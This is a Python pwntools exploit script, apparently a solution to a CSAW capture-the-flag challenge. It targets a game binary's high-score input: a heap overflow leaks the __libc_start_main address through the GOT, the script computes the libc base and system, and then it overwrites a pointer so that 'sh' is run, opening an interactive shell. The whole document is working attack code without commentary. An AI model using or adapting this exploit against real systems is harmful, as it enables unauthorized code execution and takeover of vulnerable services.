#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('pwn.chal.csaw.io', 8003)

libc_start_got = 0x602068

delay = 0.1
sleep(delay)
r.sendline('A'*26)
sleep(delay)

def game(payload):
    for i in range(26):
        r.sendline(chr(97+i))
        x = r.recvrepeat(delay)
        if x[0:4] == "High":
            r.sendline('y')
            r.sendline(payload)
            break
        if x[0:4] == 'Defa':
            r.recvrepeat(delay)
            r.sendline('y')
            i = 0
            r.recvrepeat(delay)

payload = ""
payload += 'A'*32
payload += p64(0) + p64(0x91) + p32(0x20) + p32(0x1b) + p64(libc_start_got)

game(payload)

r.recvuntil('player:')
x = r.recvuntil('score:')
r.recvrepeat(delay)
libc_start = x[1:7]
libc_start += '\x00'*2
libc_start = u64(libc_start)
print hex(libc_start)

#libc = ELF('libc-2.23.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

libc_start_off = libc.symbols['__libc_start_main']
base = libc_start - libc_start_off
system = base + libc.symbols['system']

libc_start_main = base + libc_start_off

print hex(base)

r.sendline('y')

payload = ""
payload += 'sh\x00'.ljust(8) + 'A'*8 + p64(system) + p64(base + libc.symbols['malloc']) 
game(payload)

r.recvrepeat(delay)
r.sendline('y')
r.recvrepeat(delay)
payload = "sh\x00"
game(payload)

r.interactive()
